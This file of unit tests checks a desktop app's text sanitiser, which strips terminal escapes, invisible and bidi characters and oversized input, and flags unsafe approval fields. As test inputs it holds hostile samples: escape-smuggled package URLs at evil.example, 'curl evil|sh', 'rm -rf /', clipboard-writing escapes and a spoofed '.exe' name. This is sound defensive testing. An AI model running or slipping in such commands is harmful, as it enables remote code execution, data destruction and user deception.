// P6a (client side): sanitiser strips terminal escapes, invisible/bidi/tag chars and caps size.
import { describe, expect, it } from "../../../apps/desktop/testkit/unit";
import { clean, cleanList, TEXT_CAP, TRUNCATION_MARK } from "../../../apps/desktop/src/lib/sanitize";

const ESC = "\u001b";

describe("clean()", () => {
  it("positive control: ordinary text, newlines and tabs survive unchanged", () => {
    const s = "src/App.tsx:12\tok\nline two — ünïcode ✓";
    expect(clean(s)).toBe(s);
  });

  it("strips OSC 52 clipboard writes (BEL and ST terminated, 7- and 8-bit forms)", () => {
    expect(clean(`a${ESC}]52;c;ZXZpbA==\u0007b`)).toBe("ab");
    expect(clean(`a${ESC}]52;c;ZXZpbA==${ESC}\\b`)).toBe("ab");
    expect(clean(`a\u009d52;c;ZXZpbA==\u009cb`)).toBe("ab");
    expect(clean(`x${ESC}]8;;http://evil/${ESC}\\link${ESC}]8;;${ESC}\\`)).toBe("xlink");
  });

  it("strips ANSI CSI colour/cursor sequences and stray ESC", () => {
    expect(clean(`${ESC}[31merror${ESC}[0m ${ESC}[2J${ESC}[H${ESC}c done`)).toBe("error  done");
  });

  it("drops C0 (except \\n \\t), DEL and C1 controls", () => {
    expect(clean("a\u0000b\u0007c\u0008d\u007fe\u0085f\u0080g\r\n")).toBe("abcdefg\n");
  });

  it("drops Unicode tag characters (U+E0041 etc.), bidi overrides/isolates, zero-width and BOM", () => {
    const tagA = String.fromCodePoint(0xe0041);
    const s = `ok${tagA}${String.fromCodePoint(0xe007f)}‮gnp.exe‬⁦x⁩​﻿`;
    const out = clean(s);
    expect(out).toBe("okgnp.exex");
    expect([...out].some((c) => c.codePointAt(0)! >= 0xe0000)).toBe(false);
  });

  it("caps a 10 MB value at TEXT_CAP plus the truncation mark, cheaply", () => {
    const big = "A".repeat(10 * 1024 * 1024);
    const t0 = performance.now();
    const out = clean(big);
    expect(out.length).toBe(TEXT_CAP + TRUNCATION_MARK.length);
    expect(out.endsWith(TRUNCATION_MARK)).toBe(true);
    expect(performance.now() - t0).toBeLessThan(200);
  });

  it("non-strings become empty; lists are capped per item and in count", () => {
    expect(clean({ toString: () => "<x>" })).toBe("");
    expect(clean(undefined)).toBe("");
    const l = cleanList(Array.from({ length: 100 }, () => "y".repeat(1000)));
    expect(l.length).toBe(64);
    expect(l[0]!.length).toBeLessThan(400);
  });

  it("markup is kept as inert characters (rendering decides, not the sanitiser)", () => {
    expect(clean("<script>alert(1)</script>")).toBe("<script>alert(1)</script>");
  });
});

import { inspect, inspectList } from "../../../apps/desktop/src/lib/sanitize";

describe("unterminated string escapes never swallow following text", () => {
  it("OSC without terminator keeps the rest of the line and the next lines", () => {
    expect(clean(`a${ESC}]0;title\nnext line`)).toBe("a0;title\nnext line");
    expect(clean(`left-pad${ESC}]x git+https://evil.example/p.tgz`)).toBe("left-padx git+https://evil.example/p.tgz");
  });
  it("DCS/APC without ST keeps the text after the newline", () => {
    expect(clean(`a${ESC}Pq data\nkept`)).toContain("kept");
    expect(clean(`a${ESC}_payload\nkept`)).toContain("kept");
  });
  it("terminated sequences are still stripped (positive control)", () => {
    expect(clean(`a${ESC}]0;t\u0007b`)).toBe("ab");
  });
});

describe("clean() also drops the backend invisible list", () => {
  it("U+061C, U+00AD, U+2028/2029, FE00-FE0F, E0100-E01EF", () => {
    const vs = String.fromCodePoint(0xe0100) + String.fromCodePoint(0xe01ef);
    expect(clean(`a؜b­c d e︀f️g${vs}h`)).toBe("abcdefgh");
  });
});

const BS = String.fromCharCode(92); // a literal backslash, to spell the visible escapes

describe("inspect(): fail-closed visible escaping for approval/tool fields", () => {
  it("clean text is unchanged and safe", () => {
    expect(inspect("left-pad@1.3.0")).toEqual({ text: "left-pad@1.3.0", unsafe: false });
  });
  it("unterminated OSC in a package spec is shown as raw codepoints and flagged", () => {
    const r = inspect(`left-pad@1.3.0${ESC}]x git+https://evil.example/p.tgz`);
    expect(r.text).toBe(`left-pad@1.3.0${BS}x1b]x git+https://evil.example/p.tgz`);
    expect(r.unsafe).toBe(true);
    expect(r.text).not.toContain(ESC);
  });
  it("NUL inside a package name", () => {
    expect(inspect("left-pad\u0000@evil")).toEqual({ text: `left-pad${BS}x00@evil`, unsafe: true });
  });
  it("shell text behind an OSC introducer", () => {
    const r = inspect(`echo hi ${ESC}]; curl evil|sh`);
    expect(r.text).toBe(`echo hi ${BS}x1b]; curl evil|sh`);
    expect(r.unsafe).toBe(true);
  });
  it("bidi, zero-width, tag, variation-selector and lone surrogate characters are escaped", () => {
    expect(inspect("a‮b")).toEqual({ text: "aU+202Eb", unsafe: true });
    expect(inspect("a​b").text).toBe("aU+200Bb");
    expect(inspect("a؜b").text).toBe("aU+061Cb");
    expect(inspect("a️b").text).toBe("aU+FE0Fb");
    expect(inspect(`a${String.fromCodePoint(0xe0041)}b`).text).toBe("aU+E0041b");
    expect(inspect(`a${String.fromCodePoint(0xe0100)}b`).text).toBe("aU+E0100b");
    expect(inspect("a\ud800b").text).toBe("aU+D800b");
    expect(inspect("a\u0085b").text).toBe(`a${BS}x85b`);
  });
  it("newline and tab inside a single-line field are escaped and flagged", () => {
    expect(inspect("a\nb\tc")).toEqual({ text: `a${BS}nb${BS}tc`, unsafe: true });
  });
  it("truncation and non-strings fail closed", () => {
    expect(inspect("x".repeat(600), 500).unsafe).toBe(true);
    expect(inspect(42)).toEqual({ text: "", unsafe: true });
    expect(inspect(undefined)).toEqual({ text: "", unsafe: false });
  });
  it("inspectList flags oversize lists and any unsafe item", () => {
    expect(inspectList(["pnpm", "add"]).unsafe).toBe(false);
    expect(inspectList(["pnpm", "a\u0000"]).unsafe).toBe(true);
    expect(inspectList(Array.from({ length: 70 }, () => "a")).unsafe).toBe(true);
    expect(inspectList("rm -rf /").unsafe).toBe(true);
  });
});

// S6 follow-ups (S4 review): invisible fillers are flagged like the backend, and "ESC[" is not an over-swallowing CSI
describe("S6 sanitiser follow-ups", () => {
  it.each(["\u3164", "\u115f", "\u180e", "\u034f"])("drops and flags the invisible filler U+%s", (ch) => {
    expect(clean(`ab${ch}cd`)).toBe("abcd");
    const r = inspect(`ab${ch}cd`);
    expect(r.unsafe).toBe(true);
    expect(r.text).not.toContain(ch);
  });

  it("an ESC[ introducer without a final byte only loses the introducer, not the text after it", () => {
    expect(clean(`a${ESC}[12é`)).toBe("a12é");
    expect(clean(`a${ESC}[`)).toBe("a");
    expect(clean(`a${ESC}[x`)).toBe("a"); // a letter IS a valid CSI final byte: ESC[x is one complete sequence
    expect(clean(`a${ESC}[31mred${ESC}[0m`)).toBe("ared"); // control: real CSI sequences still go
  });
});
